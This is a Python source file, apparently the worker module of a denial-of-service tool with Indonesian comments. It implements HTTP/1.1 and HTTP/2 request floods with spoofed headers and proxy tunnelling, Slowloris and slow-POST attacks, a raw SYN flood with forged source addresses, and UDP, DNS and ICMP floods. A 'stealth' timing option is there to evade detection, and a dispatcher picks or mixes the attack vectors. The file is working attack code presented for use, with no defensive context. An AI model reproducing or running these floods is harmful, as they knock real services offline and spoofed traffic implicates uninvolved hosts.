# language: Python 3, file: core/workers.py
# semua worker flood — dipanggil engine lewat Ctx
import os, random, socket, ssl, struct, string, time
from . import net

UA_DEFAULT = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
]
REF = ["https://www.google.com/", "https://www.bing.com/",
       "https://duckduckgo.com/", "https://t.co/"]
METHODS = ["GET", "POST", "HEAD"]

class Ctx:
    """Wadah state yang dibagi ke semua thread worker."""
    def __init__(self, cfg, ips, stats, stop):
        self.cfg = cfg
        self.ips = ips
        self.stats = stats
        self.stop = stop
        self.ua = net.load_lines(cfg.get("ua_file", "")) or UA_DEFAULT
        self.proxies = net.load_proxies(cfg.get("proxy_file", ""))
        self.targets = net.load_lines(cfg.get("targets_file", ""))


def _rs(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def _stealth_sleep(ctx):
    if not ctx.cfg.get("stealth"):
        return
    lo = ctx.cfg.get("stealth_min_ms", 30) / 1000.0
    hi = ctx.cfg.get("stealth_max_ms", 300) / 1000.0
    time.sleep(random.uniform(lo, hi))


def _build_body(ctx):
    mode = ctx.cfg.get("payload_mode", "rand")
    size = ctx.cfg.get("size", 1024)
    if mode == "json":
        return b'{"k":"' + _rs(size // 2).encode() + b'"}'
    if mode == "form":
        return b"k=" + _rs(size // 2).encode()
    return os.urandom(size)


# ─── HTTP/1.1 ─────────────────────────────────────────
def worker_http(ctx):
    cfg = ctx.cfg
    ctx_tls = net.tls_ctx() if cfg["tls"] else None
    path = cfg["path"]; sep = "&" if "?" in path else "?"
    while not ctx.stop.is_set():
        proxy = random.choice(ctx.proxies) if ctx.proxies else None
        try:
            if proxy:
                s = net.konek(proxy[0], proxy[1], timeout=4)
                s.sendall(f"CONNECT {cfg['host']}:{cfg['port']} HTTP/1.1\r\n"
                          f"Host: {cfg['host']}\r\n\r\n".encode())
                s.recv(64)
                if cfg["tls"]:
                    s = ctx_tls.wrap_socket(s, server_hostname=cfg["host"])
            else:
                ip = random.choice(ctx.ips)
                s = net.konek(ip, cfg["port"], timeout=4)
                if cfg["tls"]:
                    s = ctx_tls.wrap_socket(s, server_hostname=cfg["host"])

            m = random.choice(METHODS)
            body = _build_body(ctx) if m == "POST" else b""
            hdr = (
                f"{m} {path}{sep}{_rs(8)}={_rs(12)} HTTP/1.1\r\n"
                f"Host: {cfg['host']}\r\n"
                f"User-Agent: {random.choice(ctx.ua)}\r\n"
                f"Accept: */*\r\nAccept-Language: en-US,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate, br\r\n"
                f"Referer: {random.choice(REF)}\r\n"
                f"Connection: {'keep-alive' if cfg['keepalive'] else 'close'}\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}."
                f"{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                f"Cookie: s={_rs(24)}\r\n"
            ).encode()
            if body:
                hdr += f"Content-Length: {len(body)}\r\n\r\n".encode() + body
            else:
                hdr += b"\r\n"
            s.sendall(hdr)
            ctx.stats.bump(len(hdr), True)
            if not cfg["keepalive"]:
                try: s.recv(512)
                except Exception: pass
                s.close()
            else:
                for _ in range(random.randint(3, 10)):
                    if ctx.stop.is_set(): break
                    s.sendall(hdr); ctx.stats.bump(len(hdr), True)
                    _stealth_sleep(ctx)
                s.close()
            _stealth_sleep(ctx)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── HTTP/2 ───────────────────────────────────────────
H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def _h2_frame(ftype, flags, sid, payload):
    return (len(payload).to_bytes(3, "big")
            + bytes([ftype, flags])
            + struct.pack("!I", sid & 0x7FFFFFFF)
            + payload)

def _h2_lit(i, v):
    b = v.encode(); return bytes([i]) + bytes([len(b)]) + b

def _h2_new(n, v):
    nb = n.encode(); vb = v.encode()
    return b"\x00" + bytes([len(nb)]) + nb + bytes([len(vb)]) + vb

def _h2_block(ctx):
    path = ctx.cfg["path"]; sep = "&" if "?" in path else "?"
    b = b""
    b += _h2_lit(2, "GET"); b += _h2_lit(7, "https")
    b += _h2_lit(4, path + sep + _rs(8)); b += _h2_lit(1, ctx.cfg["host"])
    b += _h2_new("user-agent", random.choice(ctx.ua))
    b += _h2_new("cookie", "s=" + _rs(24))
    return b

def worker_h2(ctx):
    ctx_tls = net.tls_ctx(alpn=["h2"])
    while not ctx.stop.is_set():
        try:
            raw = net.konek(random.choice(ctx.ips), ctx.cfg["port"], timeout=4)
            s = ctx_tls.wrap_socket(raw, server_hostname=ctx.cfg["host"])
            if s.selected_alpn_protocol() != "h2":
                s.close(); continue
            s.sendall(H2_PREFACE + _h2_frame(0x4, 0x0, 0, b""))
            ctx.stats.bump(len(H2_PREFACE) + 9, True)
            for i in range(random.randint(20, 60)):
                if ctx.stop.is_set(): break
                sid = 1 + 2 * random.randint(1, 0x3FFFFFF)
                h = _h2_block(ctx)
                s.sendall(_h2_frame(0x1, 0x5, sid, h))
                ctx.stats.bump(9 + len(h), True)
            s.close()
            _stealth_sleep(ctx)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── Slowloris ────────────────────────────────────────
def worker_slow(ctx):
    ctx_tls = net.tls_ctx() if ctx.cfg["tls"] else None
    sock = []
    while not ctx.stop.is_set():
        try:
            s = net.konek(random.choice(ctx.ips), ctx.cfg["port"], timeout=4)
            if ctx.cfg["tls"]:
                s = ctx_tls.wrap_socket(s, server_hostname=ctx.cfg["host"])
            path = ctx.cfg["path"]; sep = "&" if "?" in path else "?"
            s.sendall(f"GET {path}{sep}{_rs(6)} HTTP/1.1\r\n"
                      f"Host: {ctx.cfg['host']}\r\n"
                      f"User-Agent: {random.choice(ctx.ua)}\r\n".encode())
            sock.append(s)
            ctx.stats.bump(64, True)
        except Exception as e:
            ctx.stats.bump(0, False, e)
        for s in list(sock):
            try:
                s.sendall(f"X-a: {_rs(random.randint(5, 15))}\r\n".encode())
                ctx.stats.bump(16, True)
            except Exception:
                try: sock.remove(s)
                except ValueError: pass
        time.sleep(random.uniform(2, 8))


# ─── R-U-Dead-Yet (slow POST body) ────────────────────
def worker_ruddy(ctx):
    ctx_tls = net.tls_ctx() if ctx.cfg["tls"] else None
    while not ctx.stop.is_set():
        try:
            s = net.konek(random.choice(ctx.ips), ctx.cfg["port"], timeout=4)
            if ctx.cfg["tls"]:
                s = ctx_tls.wrap_socket(s, server_hostname=ctx.cfg["host"])
            path = ctx.cfg["path"]; sep = "&" if "?" in path else "?"
            total = random.randint(100_000, 500_000)
            s.sendall(
                f"POST {path}{sep}{_rs(6)} HTTP/1.1\r\n"
                f"Host: {ctx.cfg['host']}\r\n"
                f"User-Agent: {random.choice(ctx.ua)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {total}\r\n"
                f"Connection: keep-alive\r\n\r\n".encode()
            )
            ctx.stats.bump(128, True)
            # kirim body super lambat
            sent = 0
            while sent < total and not ctx.stop.is_set():
                chunk = os.urandom(random.randint(1, 8))
                s.sendall(chunk)
                ctx.stats.bump(len(chunk), True)
                sent += len(chunk)
                time.sleep(random.uniform(0.5, 2.0))
            s.close()
        except Exception as e:
            ctx.stats.bump(0, False, e)
            time.sleep(1.0)


# ─── TCP connect ──────────────────────────────────────
def worker_tcp(ctx):
    while not ctx.stop.is_set():
        try:
            s = net.konek(random.choice(ctx.ips), ctx.cfg["port"], timeout=2)
            s.sendall(b"\x00" * 64)
            ctx.stats.bump(64, True)
            s.close()
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── SYN raw (root) ───────────────────────────────────
def worker_syn(ctx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("\n  \033[91m[!] SYN butuh root — fallback ke TCP\033[0m")
        return worker_tcp(ctx)
    while not ctx.stop.is_set():
        try:
            dst = random.choice(ctx.ips)
            dst_bin = socket.inet_aton(dst)
            src_bin = bytes([random.randint(1, 223), random.randint(0, 255),
                             random.randint(0, 255), random.randint(1, 254)])
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp = struct.pack("!HHIIBBHHH",
                              sport, ctx.cfg["port"], seq,
                              0, 0x50, 0x02, 64240, 0, 0)
            pseudo = src_bin + dst_bin + b"\x00\x06" + struct.pack("!H", len(tcp))
            tcp = struct.pack("!HHIIBBHHH",
                              sport, ctx.cfg["port"], seq,
                              0, 0x50, 0x02, 64240,
                              net.checksum(pseudo + tcp), 0)
            ip = struct.pack("!BBHHHBBH4s4s",
                             0x45, 0, 20 + len(tcp), random.randint(0, 0xFFFF),
                             0x4000, 64, 6, 0, src_bin, dst_bin)
            ip = struct.pack("!BBHHHBBH4s4s",
                             0x45, 0, 20 + len(tcp), random.randint(0, 0xFFFF),
                             0x4000, 64, 6, net.checksum(ip), src_bin, dst_bin)
            s.sendto(ip + tcp, (dst, 0))
            ctx.stats.bump(len(ip) + len(tcp), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── UDP ──────────────────────────────────────────────
def worker_udp(ctx):
    while not ctx.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            body = _build_body(ctx)
            s.sendto(body, (random.choice(ctx.ips), ctx.cfg["port"]))
            s.close()
            ctx.stats.bump(len(body), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── DNS ──────────────────────────────────────────────
def _dns_query():
    txid = random.randint(0, 0xFFFF).to_bytes(2, "big")
    header = txid + b"\x01\x00" + b"\x00\x01" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00"
    qname = b""
    for _ in range(random.randint(3, 5)):
        seg = _rs(random.choice([2, 3])).lower().encode()
        qname += len(seg).to_bytes(1, "big") + seg
    qname += b"\x00"
    return header + qname + random.choice([b"\x00\x01", b"\x00\xff"]) + b"\x00\x01"

def worker_dns(ctx):
    while not ctx.stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            pkt = _dns_query()
            s.sendto(pkt, (random.choice(ctx.ips), ctx.cfg["port"]))
            s.close()
            ctx.stats.bump(len(pkt), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── ICMP (root) ──────────────────────────────────────
def worker_icmp(ctx):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("\n  \033[91m[!] ICMP butuh root — dilewati\033[0m")
        return
    while not ctx.stop.is_set():
        try:
            ident = random.randint(0, 0xFFFF)
            seq = random.randint(0, 0xFFFF)
            payload = os.urandom(random.randint(32, 1400))
            hdr = struct.pack("!BBHHH", 8, 0, 0, ident, seq)
            csum = net.checksum(hdr + payload)
            hdr = struct.pack("!BBHHH", 8, 0, csum, ident, seq)
            s.sendto(hdr + payload, (random.choice(ctx.ips), 0))
            ctx.stats.bump(len(hdr) + len(payload), True)
        except Exception as e:
            ctx.stats.bump(0, False, e)


# ─── peta & dispatcher ────────────────────────────────
WORKERS = {
    "http": worker_http, "h2": worker_h2, "slow": worker_slow,
    "ruddy": worker_ruddy, "tcp": worker_tcp, "syn": worker_syn,
    "udp": worker_udp, "dns": worker_dns, "icmp": worker_icmp,
}
NON_ROOT = ["http", "h2", "slow", "ruddy", "tcp", "udp", "dns"]

def get_worker(name, ctx):
    import threading
    if name in WORKERS:
        return threading.Thread(target=WORKERS[name], args=(ctx,), daemon=True)
    if name == "mixed":
        pil = list(NON_ROOT)
        if ctx.cfg["tls"]:
            pil.append("h2")
        return get_worker(random.choice(pil), ctx)
    raise ValueError(f"vektor tidak dikenal: {name}")